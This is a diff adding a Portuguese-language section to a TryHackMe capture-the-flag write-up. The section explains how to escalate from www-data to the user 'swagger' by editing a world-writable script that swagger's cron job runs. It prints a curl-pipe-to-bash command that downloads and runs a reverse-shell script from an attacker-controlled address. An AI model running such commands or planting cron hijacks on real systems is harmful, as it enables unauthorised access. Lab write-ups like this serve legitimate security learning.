@@ -6,6 +6,47 @@
 - 🔍 **Prova:** [TryHackMe - 0ff3ns!v3 S3cur!ty - Sw4gg3r](https://tryhackme.com/room/0ff3nsv3s3curtysw4gg3r)
 
 ---
+---
+
+## 🧠 Resumo: Como Escalar Privilégios para o Usuário 'swagger'
+
+### Situação:
+- Existe um arquivo chamado `script.sh` com permissão `777`:
+  ```txt
+  -rwxrwxrwx 1 user-swagger user-swagger 184 Jun 1 2023 script.sh
+  ```
+- Isso significa que **qualquer usuário pode ler, escrever e executar** esse arquivo.
+- O **dono do arquivo é o usuário 'swagger'**, que tem mais privilégios que o usuário atual (`www-data`).
+
+### Problema:
+- Estamos logados como `www-data`, um usuário limitado.
+- Executar o script manualmente com `www-data` **não eleva os privilégios**, porque o shell reverso retornará com os mesmos direitos de `www-data`.
+
+### Solução:
+1. Editar o `script.sh` e **inserir um comando de shell reverso**, por exemplo:
+   ```bash
+   curl http://192.168.100.168:8000/shell_2.sh | bash
+   ```
+2. **Esperar o cron job executá-lo automaticamente** (ele roda a cada minuto).
+   - Como o script será executado pelo próprio usuário `swagger`, o shell reverso retornará com os privilégios dele.
+
+### Conclusão:
+- A escalada de privilégios acontece **não quando você executa o script manualmente**, mas quando o **cron do 'swagger' executa o script que você editou**.
+
+![image](https://github.com/user-attachments/assets/b0322b76-b96a-4585-a5cf-a485ee1183bb)
+- Por exemplo nesta imagem eu escalei previlegio do meu propio usuario e consegui, agora so fazer no arq do usuario swagger
+---
+
+### Agora vamos alterar o conteudo do arquivo e colocar para ele buscar naquele mesmo servidor python baixar e execuar o shel reverse enquanto escutamos do outro lado 
+![image](https://github.com/user-attachments/assets/35d15a91-bf21-42f9-b622-afb6d0e2707c)
+- Arquivo alterado com a shell ,agora abrimos outro terminal e escutamos na porta 4444 enquanto esperamos a atualização do comando que nos alteramos para enviar o cmd shell
+![image](https://github.com/user-attachments/assets/c1d126d2-8923-42f5-823d-1ac0c41a0378)
+
+
+- Temos duas shels ativas agora uma do wwwdata que era fraca e nao possuia mt previlegios , e a do swagger que vamos explorar ainda.
+![image](https://github.com/user-attachments/assets/26fbd6bc-317c-48f5-9612-7495663d43b5)
+
+
 
 # depois de explorar como swagger....
 
